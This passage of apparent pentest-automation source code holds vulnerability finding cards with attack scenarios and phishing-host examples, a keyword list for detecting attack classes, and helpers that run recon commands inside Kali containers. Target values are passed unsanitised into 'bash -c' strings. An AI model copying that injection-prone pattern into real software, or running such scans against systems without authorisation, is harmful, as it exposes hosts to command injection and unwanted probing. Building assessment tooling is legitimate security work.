            "Disable GraphQL introspection in production. Use allowlisting for permitted queries.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",  # 5.3
            "An attacker sends an introspection query to discover the entire API schema—every type, field, query, and mutation. This reveals hidden admin endpoints, sensitive fields (SSN, creditCard), and internal data models that guide targeted attacks."
        ),
        "graphql_error_verbose": (
            "Verbose GraphQL Error Messages",
            "medium",
            "info_leak_errors",
            "GraphQL responses include verbose error details with stack traces, column info, or internal extensions.",
            "Sanitize GraphQL error responses in production. Return generic error messages to clients.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",  # 5.3
            "An attacker sends malformed GraphQL queries to trigger verbose error responses that expose internal database column names, file paths, and stack traces. This information reveals the application's internal architecture and guides further exploitation."
        ),
        "redirect_chain_open": (
            "Open Redirect to External Domain",
            "medium",
            "open_redirect",
            "The endpoint redirects to an external domain, which could be exploited for phishing.",
            "Validate all redirect targets against a whitelist of allowed domains.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",  # 6.1
            "An attacker crafts a URL like https://trusted-app.com/redirect?url=https://evil-phishing.com/login that appears legitimate. When a victim clicks this link, they are redirected to the attacker's phishing site which mimics the real login page, capturing credentials."
        ),
        "cipher_suite_weak": (
            "Weak TLS/SSL Version Detected",
            "high",
            "tls_security",
            "Weak TLS/SSL version (SSLv3 or TLS 1.0) reference detected in server headers.",
            "Disable SSLv3 and TLS 1.0/1.1. Only support TLS 1.2+ with strong cipher suites.",
            "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 6.8
            "An attacker on the same network performs a POODLE or BEAST attack against the weak TLS version. By exploiting known cryptographic weaknesses in SSLv3/TLS 1.0, they can decrypt encrypted traffic and steal session cookies or credentials."
        ),
        "x_frame_options_missing": (
            "Missing X-Frame-Options and CSP frame-ancestors",
            "low",
            "clickjacking",
            "Neither X-Frame-Options nor CSP frame-ancestors is set, allowing the page to be framed.",
            "Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none' header.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",  # 4.3
            "An attacker creates a transparent iframe overlay on their malicious page, loading the vulnerable application inside it. They trick the victim into clicking on the invisible iframe, performing unintended actions (clickjacking) like changing account settings."
        ),

        # INFO severity (9 signals) - these won't be auto-persisted but are tracked
        "session_timeout_missing": (
            "Session Cookie Without Expiry",
            "info",
            "session_management",
            "Session cookies have no Max-Age or Expires attribute, creating persistent sessions.",
            "Set appropriate Max-Age or Expires on session cookies. Implement server-side session timeouts.",
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",  # 3.1
            "A user logs in on a shared computer. Because the session cookie has no expiry, it persists until the browser is closed. If the user forgets to close the browser, the next person can access their account."
        ),
        "race_condition_timing": (
            "Slow Response (Race Condition Target)",
            "info",
            "race_condition",
            "Response time exceeds 500ms, suggesting the endpoint performs complex operations susceptible to race conditions.",
            "Implement proper locking, transactions, or idempotency checks for time-sensitive operations.",
            "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",  # 3.1
            "An attacker sends multiple simultaneous requests to a slow endpoint (e.g., fund transfer, coupon redemption). If the server doesn't properly serialize requests, the attacker can exploit the race window to double-spend, apply discounts multiple times, or bypass quantity limits."
        ),
        "version_disclosure": (
            "Server Version Disclosure",
            "info",
            "info_leak_headers",
            "The Server header reveals the web server version, aiding targeted attacks.",
            "Remove or obfuscate the Server header.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",  # 0.0 - Pure information gathering
            "An attacker examines HTTP response headers and sees 'Server: Apache/2.4.29 (Ubuntu)'. This reveals the exact software version. The attacker searches exploit databases for known vulnerabilities in Apache 2.4.29 and launches targeted exploits."
        ),
        "missing_x_xss_protection": (
            "Missing X-XSS-Protection Header",
            "info",
            "security_headers",
            "The X-XSS-Protection header is not set (deprecated but still used by older browsers).",
            "Add X-XSS-Protection: 1; mode=block or rely on modern Content-Security-Policy.",
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:N",  # 0.0 - Minimal impact (header deprecated)
            "While X-XSS-Protection is deprecated, some legacy browsers (IE, old Safari) still use it. Without this header, those browsers won't enable built-in XSS filters, slightly increasing XSS risk for users on outdated software. Modern browsers ignore this header in favor of CSP."
        ),
        "missing_permissions_policy": (
            "Missing Permissions-Policy Header",
            "info",
            "security_headers",
            "The Permissions-Policy header is not set, allowing unrestricted browser feature access.",
            "Add Permissions-Policy header to restrict camera, microphone, geolocation, etc.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",  # 0.0 - Defense-in-depth measure
            "Without Permissions-Policy, an XSS vulnerability could allow an attacker to access browser features like camera, microphone, or geolocation without additional permission prompts. Setting this header restricts feature access, limiting XSS impact."
        ),
        "redirect_detected": (
            "HTTP Redirect Detected",
            "info",
            "redirect",
            "The endpoint returns a redirect response. Verify that redirect targets are validated.",
            "Validate all redirect URLs against a whitelist to prevent open redirect vulnerabilities.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",  # 0.0 - Informational only
            "The endpoint performs a redirect. If the redirect target is user-controlled without validation, an attacker can craft a link (https://trusted-site.com/redirect?url=https://evil.com) that appears legitimate but redirects to a phishing site. This is an open redirect vulnerability."
        ),
        "error_page_title": (
            "Error Page Title Disclosure",
            "info",
            "info_leak_errors",
            "Error page titles reveal information about the application framework or error type.",
            "Use generic error page titles in production.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",  # 0.0 - Minor information disclosure
            "Error page titles like '404 - Django Debug Page' or 'Laravel Error - Route Not Found' reveal the application framework and version. This helps attackers identify the technology stack and search for framework-specific vulnerabilities."
        ),
        "jwt_detected": (
            "JWT Token Detected",
            "info",
            "auth_token",
            "JWT token detected in request or response. Verify proper validation and expiry.",
            "Ensure JWT tokens are properly signed, validated, and have short expiry times.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",  # 0.0 - Depends on JWT implementation
            "JWT tokens were detected in traffic. If JWTs use weak signing algorithms (none, HS256 with weak secrets), lack expiry (no 'exp' claim), or aren't validated properly, an attacker can forge tokens or reuse expired ones to bypass authentication."
        ),
        "slow_response": (
            "Slow Response Time (Timing Attack Risk)",
            "info",
            "timing",
            "Response time is significantly slower than baseline, which may indicate timing-based vulnerabilities.",
            "Implement constant-time comparisons for sensitive operations. Use rate limiting.",
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:N",  # 0.0 - Potential side-channel
            "A login endpoint takes 500ms for invalid usernames but 700ms for valid usernames with wrong passwords. This timing difference reveals whether a username exists. An attacker can use this to enumerate valid usernames, then focus password attacks on those accounts."
        ),
    }

    async def auto_persist_risk_signals(self, risk_signals: list, url: str) -> int:
        """Auto-create finding cards from exchange analyzer risk signals.

        Only persists HIGH and MEDIUM severity signals. Returns count of cards created.

        Args:
            risk_signals: List of risk signal dicts from exchange analyzer
            url: Target URL for context

        Returns:
            Number of cards successfully created
        """
        if not risk_signals or not self.current_assessment_id:
            return 0

        created = 0
        seen_types = set()

        for signal in risk_signals:
            sig_type = signal.get("type", "")
            severity = signal.get("severity", "info")

            # Only persist high/medium/low severity (not info), deduplicate by type per call
            if severity in ("info",) or sig_type in seen_types:
                continue
            seen_types.add(sig_type)

            # Look up card info from mapping
            card_info = self._RISK_SIGNAL_CARDS.get(sig_type)
            if not card_info:
                continue

            title, card_severity, vuln_class, desc_template, rec_template, cvss_vector, attack_scenario = card_info
            detail = signal.get("detail", "")

            # Auto-compute CVSS score from vector
            cvss_score = None
            if cvss_vector:
                try:
                    from lib.risk_engine import CVSSv31
                    cvss_score = CVSSv31(cvss_vector).base_score()
                except Exception:
                    pass

            result = await self.safe_add_card(
                card_type="finding",
                title=title,
                severity=card_severity.upper(),  # Normalize to uppercase for consistent display
                status="confirmed",  # Auto-detected findings are confirmed
                target_service=url,
                description=desc_template,
                recommendation=rec_template,
                attack_scenario=attack_scenario,
                cvss_vector=cvss_vector,
                cvss_score=cvss_score,
                affected_endpoints=url,
                evidence=json.dumps({
                    "description": f"Automatically detected: {detail}",
                    "detection_method": "exchange_analysis",
                    "signal_type": sig_type,
                }),
                context=f"Detected via automated exchange analysis. {detail}",
                technical_analysis=detail,
            )

            if result.ok and not result.skipped:
                created += 1
                log.info(f"auto_persist_risk_signals: Created finding '{title}' for {url}")

        return created

    async def safe_add_recon(
        self,
        data_type: str,
        name: str,
        details: Optional[Dict[str, Any]] = None,
        phase: Optional[str] = None,
    ) -> SafeResult:
        """Add recon data to the current assessment, safely.

        Never raises.  Returns a :class:`SafeResult`.
        """
        if self.current_assessment_id is None:
            return SafeResult(ok=False, skipped=True, reason="no_assessment")

        try:
            result = await self.add_recon_data(
                assessment_id=self.current_assessment_id,
                data_type=data_type,
                name=name,
                details=details,
                discovered_in_phase=phase,
            )
            return SafeResult(ok=True, data=result)
        except Exception as e:
            log.warning(f"safe_add_recon failed for '{name}': {e}")
            return SafeResult(ok=False, reason=f"error: {e}")

    async def safe_add_recon_batch(
        self,
        entries: List[Dict[str, Any]],
    ) -> SafeResult:
        """Add multiple recon entries in one call, safely.

        Each entry should have keys: data_type, name, and optionally
        details, discovered_in_phase.

        Never raises.  Returns a :class:`SafeResult`.
        """
        if self.current_assessment_id is None:
            return SafeResult(ok=False, skipped=True, reason="no_assessment")
        if not entries:
            return SafeResult(ok=True, skipped=True, reason="empty_entries")

        try:
            response = await self.http_client.post(
                f"{self.backend_url}/assessments/{self.current_assessment_id}/recon/batch",
                json=entries,
            )
            response.raise_for_status()
            return SafeResult(ok=True, data=response.json())
        except Exception as e:
            # Fallback: add entries one-by-one
            log.warning(f"safe_add_recon_batch: batch endpoint failed ({e}), falling back to individual adds")
            for entry in entries:
                await self.safe_add_recon(
                    data_type=entry.get("data_type", ""),
                    name=entry.get("name", ""),
                    details=entry.get("details"),
                    phase=entry.get("discovered_in_phase"),
                )
            return SafeResult(ok=False, reason=f"batch_failed_used_fallback: {e}")

    # ========== Coverage Tracking Integration ==========

    async def _try_mark_coverage(
        self,
        target_service: Optional[str],
        title: str,
        context: Optional[str],
    ) -> None:
        """Best-effort: auto-mark matching coverage cells as vulnerable.

        Infers vuln_class from title/context keywords and looks for a
        matching pending cell in the coverage matrix.  Failures are
        logged at debug level and never raised.
        """
        if self.current_assessment_id is None:
            return

        try:
            from lib.world_model_db import get_world_model_db
            db = await get_world_model_db(self.current_assessment_id)

            # Infer vuln_class from keywords in title + context
            combined = f"{title or ''} {context or ''}".lower()
            vuln_class = None
            keyword_map = {
                "sqli": ["sql injection", "sqli", "sql error", "union select"],
                "xss": ["xss", "cross-site scripting", "script injection"],
                "ssrf": ["ssrf", "server-side request"],
                "idor": ["idor", "insecure direct object", "bola"],
                "auth_bypass": ["auth bypass", "authentication bypass", "unauthorized"],
                "path_traversal": ["path traversal", "directory traversal", "lfi", "rfi"],
                "injection": ["command injection", "cmdi", "rce", "code injection"],
                "misconfig": ["misconfiguration", "misconfig", "default cred"],
                "info_disclosure": ["information disclosure", "info leak", "sensitive data"],
            }
            for vc, keywords in keyword_map.items():
                if any(kw in combined for kw in keywords):
                    vuln_class = vc
                    break

            if not vuln_class:
                return

            # Look for matching pending coverage cell
            rows = await db._fetchall(
                "SELECT id, endpoint_id FROM wm_coverage_matrix "
                "WHERE assessment_id = $1 AND vuln_class = $2 AND status = 'pending' "
                "LIMIT 5",
                (db._assessment_id, vuln_class),
            )

            if not rows:
                return

            # If target_service is set, try to match against endpoints
            for row in rows:
                cell_id = row["id"]
                try:
                    await db._execute(
                        "UPDATE wm_coverage_matrix SET status = 'vulnerable', "
                        "result_summary = $1, updated_at = NOW() "
                        "WHERE id = $2 AND assessment_id = $3",
                        (f"Auto-marked from finding: {title[:100]}", cell_id, db._assessment_id),
                    )
                    log.debug("Auto-marked coverage cell %s as vulnerable", cell_id)
                    break  # Mark only the first matching cell
                except Exception:
                    pass
        except Exception as exc:
            log.debug("_try_mark_coverage failed: %s", exc)

    # ========== Discovery Feedback Loop ==========

    async def _on_endpoint_discovered(self, event_data: Dict[str, Any]) -> None:
        """Best-effort hook called when new endpoints are discovered.

        Called by crawler, endpoint_probe, and form discovery when new
        endpoints are found. Attempts to auto-extend the coverage matrix
        if one exists for the current assessment.

        Parameters
        ----------
        event_data : dict
            Keys: source (str), count (int), optional crawl_id, endpoint_id, etc.
        """
        if self.current_assessment_id is None:
            return

        try:
            from lib.world_model_db import get_world_model_db
            db = await get_world_model_db(self.current_assessment_id)

            # Check if a coverage matrix exists (has any rows)
            rows = await db._fetchall(
                "SELECT COUNT(*) as cnt FROM wm_coverage_matrix WHERE assessment_id = $1",
                (db._assessment_id,),
            )
            if not rows or rows[0]["cnt"] == 0:
                return  # No coverage matrix yet, nothing to extend

            source = event_data.get("source", "unknown")
            count = event_data.get("count", 0)
            log.info(
                "Endpoint discovery: %d new endpoint(s) from %s — extending matrix",
                count, source,
            )

            # Auto-extend coverage matrix with new endpoints
            from lib.discovery_monitor import DiscoveryMonitor
            monitor = DiscoveryMonitor(db)

            since = event_data.get("since")
            if since:
                events = await monitor.check_new_endpoints(since)
                if events:
                    base_url = self.current_base_url or event_data.get("base_url", "")
                    if base_url:
                        extend_result = await monitor.extend_coverage(events, base_url)
                        new_cells = extend_result.get("new_cells_created", 0)
                        if new_cells > 0:
                            log.info("Coverage matrix extended by %d new cells", new_cells)

                            if self.activity_logger:
                                await self.activity_logger.log_recon_data(
                                    data_type="coverage_matrix_extension",
                                    count=new_cells,
                                    details={"source": source, "trigger": "auto_discovery"},
                                )

        except Exception as exc:
            log.debug("_on_endpoint_discovered failed: %s", exc)

    # ========== Docker/Container Methods ==========

    async def _run_command(self, command: List[str], timeout: float = 120.0) -> Dict[str, Any]:
        """Run a system command with timeout to prevent hangs on docker socket issues."""
        try:
            file_log.debug(f"Executing command: {' '.join(command)}")

            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )

            return {
                "success": process.returncode == 0,
                "returncode": process.returncode,
                "stdout": stdout.decode('utf-8', errors='replace').strip(),
                "stderr": stderr.decode('utf-8', errors='replace').strip(),
                "command": ' '.join(command),
                "error_type": self._classify_error(process.returncode, stderr.decode('utf-8', errors='replace'))
            }

        except asyncio.TimeoutError:
            try:
                process.kill()
                await process.communicate()
            except Exception:
                pass
            file_log.warning(f"Command timed out after {timeout}s: {' '.join(command)}")
            return {
                "success": False,
                "returncode": -1,
                "stdout": "",
                "stderr": f"Command timed out after {timeout}s",
                "command": ' '.join(command),
                "error_type": "timeout",
                "raw_error": f"Timed out after {timeout}s"
            }

        except FileNotFoundError as e:
            return {
                "success": False,
                "returncode": -1,
                "stdout": "",
                "stderr": f"Command not found: {command[0]}",
                "command": ' '.join(command),
                "error_type": "command_not_found",
                "raw_error": str(e)
            }
        except Exception as e:
            return {
                "success": False,
                "returncode": -1,
                "stdout": "",
                "stderr": f"Execution failed: {str(e)}",
                "command": ' '.join(command),
                "error_type": "execution_failed",
                "raw_error": str(e)
            }

    def _classify_error(self, returncode: int, stderr: str) -> str:
        """Classify the type of error based on return code and stderr"""
        if returncode == 127:
            return "command_not_found"
        elif returncode == 126:
            return "permission_denied"
        elif returncode == 2:
            return "invalid_arguments"
        elif "not found" in stderr.lower():
            return "command_not_found"
        elif "permission denied" in stderr.lower():
            return "permission_denied"
        elif "invalid" in stderr.lower() or "usage:" in stderr.lower():
            return "invalid_command"
        elif returncode != 0:
            return "command_failed"
        else:
            return "success"

    async def check_tool_availability(self, tool_name: str) -> bool:
        """Check if a tool is available in the container"""
        if not self.current_container:
            return False

        # Use cache if available
        cache_key = f"{self.current_container}:{tool_name}"
        if cache_key in self.tool_cache:
            return self.tool_cache[cache_key]

        try:
            result = await self._run_command([
                "docker", "exec", self.current_container, "bash", "-c",
                f"which {tool_name}"
            ])

            available = result["success"]
            self.tool_cache[cache_key] = available
            return available

        except Exception:
            self.tool_cache[cache_key] = False
            return False

    async def validate_container_status(self) -> Dict[str, Any]:
        """Validate and potentially start the current container"""
        if not self.current_container:
            return {"success": False, "error": "No container selected"}

        try:
            # Check container status
            result = await self._run_command([
                "docker", "inspect", self.current_container, "--format", "{{.State.Status}}"
            ])

            if not result["success"]:
                return {"success": False, "error": "Container not found", "details": result["stderr"]}

            status = result["stdout"].strip()

            if status == "running":
                return {"success": True, "status": "running"}
            elif status in ["created", "exited"]:
                # Try to start the container
                file_log.info(f"Starting container {self.current_container}...")
                start_result = await self._run_command([
                    "docker", "start", self.current_container
                ])

                if start_result["success"]:
                    return {"success": True, "status": "started"}
                else:
                    return {
                        "success": False,
                        "error": f"Failed to start container",
                        "details": start_result["stderr"]
                    }
            else:
                return {"success": False, "error": f"Container in invalid state: {status}"}

        except Exception as e:
            return {"success": False, "error": f"Container validation failed: {str(e)}"}

    async def get_output_max_length(self) -> int:
        """Get output_max_length setting from backend (with cache)"""
        current_time = time.time()

        # Return cached value if still valid
        if (current_time - self.output_max_length_cache_time) < self.output_max_length_cache_ttl:
            return self.output_max_length

        # Fetch from backend
        try:
            response = await self.http_client.get(f"{self.backend_url}/system/settings/output_max_length")
            if response.status_code == 200:
                data = response.json()
                self.output_max_length = int(data["value"])
                self.output_max_length_cache_time = current_time
                file_log.debug(f"Loaded output_max_length setting: {self.output_max_length}")
            else:
                file_log.warning(f"Failed to load output_max_length setting, using default: {self.output_max_length}")
        except Exception as e:
            file_log.warning(f"Error fetching output_max_length setting: {e}, using default: {self.output_max_length}")

        return self.output_max_length

    async def get_command_history_limit(self) -> int:
        """Get command_history_limit setting from backend (with cache)"""
        current_time = time.time()

        # Return cached value if still valid
        if (current_time - self.command_history_limit_cache_time) < self.command_history_limit_cache_ttl:
            return self.command_history_limit

        # Fetch from backend
        try:
            response = await self.http_client.get(f"{self.backend_url}/system/settings/command_history_limit")
            if response.status_code == 200:
                data = response.json()
                self.command_history_limit = int(data["value"])
                self.command_history_limit_cache_time = current_time
                file_log.debug(f"Loaded command_history_limit setting: {self.command_history_limit}")
            else:
                file_log.warning(f"Failed to load command_history_limit setting, using default: {self.command_history_limit}")
        except Exception as e:
            file_log.warning(f"Error fetching command_history_limit setting: {e}, using default: {self.command_history_limit}")

        return self.command_history_limit

    def format_output(self, output: str, max_length: Optional[int] = None) -> str:
        """Format and truncate output for display"""
        if not output:
            return output

        # Use provided max_length or fall back to instance variable
        if max_length is None:
            max_length = self.output_max_length

        # Remove ANSI escape sequences
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        clean_output = ansi_escape.sub('', output)

        # Truncate if too long (skip if max_length is -1 for unlimited)
        if max_length != -1 and len(clean_output) > max_length:
            return clean_output[:max_length] + f"\n\n...(output truncated - showing {max_length}/{len(clean_output)} chars)"

        return clean_output

    async def discover_containers(self, force_refresh: bool = False) -> List[Dict[str, Any]]:
        """Discover Kali pentesting containers with intelligent caching"""
        current_time = time.time()

        if (not force_refresh and
                self.containers_cache and
                (current_time - self.cache_timestamp) < self.cache_ttl):
            file_log.debug("Using cached container list")
            return self.containers_cache

        file_log.info("Discovering Kali containers...")
        containers = []

        try:
            # Try Docker approach first
            result = await self._run_command([
                "docker", "ps", "-a",
                "--format", "json"
            ])

            if result["success"] and result["stdout"]:
                for line in result["stdout"].split('\n'):
                    if line.strip():
                        try:
                            container_data = json.loads(line)
                            image = container_data.get("Image", "")
                            name = container_data.get("Names", "unknown").lstrip('/')

                            if ("kali" in image.lower() or
                                    "kalilinux" in image.lower() or
                                    name.startswith(("kali-", "pentest-"))):
                                containers.append({
                                    "name": name,
                                    "image": image,
                                    "status": container_data.get("State", "unknown"),
                                    "id": container_data.get("ID", "unknown")[:12],
                                    "created": container_data.get("CreatedAt", "unknown"),
                                    "ports": [],
                                    "source": "docker"
                                })
                        except (json.JSONDecodeError, KeyError, AttributeError) as e:
                            file_log.debug(f"Error parsing container data: {e}")
                            continue

        except Exception as e:
            log.error(f"Docker discovery failed: {e}")
            containers = []

        self.containers_cache = containers
        self.cache_timestamp = current_time
        file_log.info(f"Discovered {len(containers)} containers")
        return containers

    async def execute_container_command(self, container_name: str, command: str) -> Dict[str, Any]:
        """Execute a command in a pentesting container with improved error handling"""
        file_log.info(f"Executing in {container_name}: {command[:50]}...")

        # Validate container first
        validation = await self.validate_container_status()
        if not validation["success"]:
            return {
                "success": False,
                "container": container_name,
                "command": command,
                "error": f"Container validation failed: {validation['error']}",
                "details": validation.get("details", ""),
                "execution_time": 0
            }

        start_time = time.time()

        try:
            # Execute command directly (Kali doesn't need bashrc sourcing like Exegol)
            wrapped_command = f"{command}"

            result = await self._run_command([
                "docker", "exec", container_name, "bash", "-c", wrapped_command
            ])

            execution_time = time.time() - start_time

            # Add to history
            if len(self.command_history) >= self.max_history:
                self.command_history = self.command_history[-25:]

            self.command_history.append({
                "timestamp": start_time,
                "container": container_name,
                "command": command[:100] + "..." if len(command) > 100 else command,
                "success": result["success"],
                "execution_time": execution_time
            })

            # Persist to command_history table for audit trail
            await self._log_command_to_db(
                container_name=container_name,
                command=command,
                stdout=result.get("stdout", ""),
                stderr=result.get("stderr", ""),
                returncode=result.get("returncode"),
                execution_time=execution_time,
                success=result["success"],
            )

            # Refresh output_max_length setting from backend
            await self.get_output_max_length()

            # Format outputs - preserve raw error messages
            formatted_stdout = self.format_output(result["stdout"]) if result["stdout"] else ""
            formatted_stderr = result["stderr"] if result["stderr"] else ""

            return {
                "success": result["success"],
                "container": container_name,
                "command": command,
                "stdout": formatted_stdout,
                "stderr": formatted_stderr,
                "returncode": result["returncode"],
                "execution_time": execution_time,
                "error_type": result.get("error_type", "success"),
                "raw_error": result.get("raw_error", ""),
                "method": "docker"
            }

        except Exception as e:
            execution_time = time.time() - start_time

            self.command_history.append({
                "timestamp": start_time,
                "container": container_name,
                "command": command[:100] + "..." if len(command) > 100 else command,
                "success": False,
                "execution_time": execution_time,
                "error": str(e)
            })

            # Persist failed command to database
            await self._log_command_to_db(
                container_name=container_name,
                command=command,
                stderr=str(e),
                execution_time=execution_time,
                success=False,
            )

            return {
                "success": False,
                "container": container_name,
                "command": command,
                "error": str(e),
                "execution_time": execution_time,
                "error_type": "execution_failed"
            }

    async def _log_command_to_db(
        self,
        container_name: str,
        command: str,
        stdout: str = "",
        stderr: str = "",
        returncode: Optional[int] = None,
        execution_time: float = 0.0,
        success: bool = False,
    ) -> None:
        """Persist a command execution to the command_history table.

        Best-effort: failures are logged but never raised.
        """
        if not (hasattr(self, "pg_pool") and self.pg_pool and self.current_assessment_id):
            return
        try:
            async with self.pg_pool.acquire() as conn:
                await conn.execute(
                    """INSERT INTO command_history
                       (assessment_id, container_name, command, stdout, stderr,
                        returncode, execution_time, success, phase, status, created_at)
                       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, NOW())""",
                    self.current_assessment_id,
                    container_name,
                    command[:2000],
                    (stdout or "")[:10000],
                    (stderr or "")[:5000],
                    returncode,
                    execution_time,
                    success,
                    None,  # phase — could be wired later
                    "completed" if success else "failed",
                )
                file_log.debug(
                    "Logged command to database for assessment %s",
                    self.current_assessment_id,
                )
        except Exception as e:
            file_log.warning("Failed to log command to database: %s", e)

    async def subdomain_enumeration(self, domain: str) -> Dict[str, Any]:
        """Perform subdomain enumeration using available tools"""
        if not self.current_container:
            return {"success": False, "error": "No container selected"}

        commands = []
        results = []

        # Check for subfinder
        if await self.check_tool_availability("subfinder"):
            commands.append(f"subfinder -d {domain} -silent")

        # Check for amass
        if await self.check_tool_availability("amass"):
            commands.append(f"amass enum -passive -d {domain}")

        # Fallback to basic DNS techniques
        if not commands:
            commands.append(f"dig +short {domain} ANY")
            commands.append(f"dig +short www.{domain}")
            commands.append(f"dig +short mail.{domain}")
            commands.append(f"dig +short ftp.{domain}")

        for cmd in commands:
            result = await self.execute_container_command(self.current_container, cmd)
            results.append({
                "command": cmd,
                "success": result["success"],
                "output": result.get("stdout", ""),
                "error": result.get("stderr", ""),
                "error_type": result.get("error_type", "")
            })

        return {"success": True, "results": results}

    async def ssl_analysis(self, target: str) -> Dict[str, Any]:
        """Perform SSL certificate analysis"""
        if not self.current_container:
            return {"success": False, "error": "No container selected"}

        # Parse target to get host and port
        if ":" in target:
            host, port = target.split(":", 1)
        else:
            host, port = target, "443"

        commands = [
            f"openssl s_client -connect {host}:{port} -servername {host} </dev/null 2>/dev/null | openssl x509 -noout -text",
            f"openssl s_client -connect {host}:{port} -servername {host} </dev/null 2>/dev/null | openssl x509 -noout -dates",
            f"openssl s_client -connect {host}:{port} -servername {host} </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer"
        ]

        results = []
        for cmd in commands:
            result = await self.execute_container_command(self.current_container, cmd)
            results.append({
                "command": cmd.split(" | ")[-1],
                "success": result["success"],
                "output": result.get("stdout", ""),
                "error": result.get("stderr", ""),
                "error_type": result.get("error_type", "")
            })

        return {"success": True, "results": results}

    async def tech_stack_detection(self, url: str) -> Dict[str, Any]:
        """Detect technology stack of a website"""
        if not self.current_container:
            return {"success": False, "error": "No container selected"}

        # Ensure URL has protocol
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"

        commands = [
            f"curl -I {url} 2>/dev/null | head -20",
            f"curl -s {url} 2>/dev/null | grep -i 'generator\\|powered\\|built\\|framework' | head -10",
            f"whatweb {url}" if await self.check_tool_availability("whatweb") else f"curl -s {url} 2>/dev/null | head -50"
        ]

        results = []
        for cmd in commands:
            if cmd:
                result = await self.execute_container_command(self.current_container, cmd)
                results.append({
                    "command": cmd.split(" | ")[0],
                    "success": result["success"],
                    "output": result.get("stdout", ""),
                    "error": result.get("stderr", ""),
                    "error_type": result.get("error_type", "")
                })

        return {"success": True, "results": results}
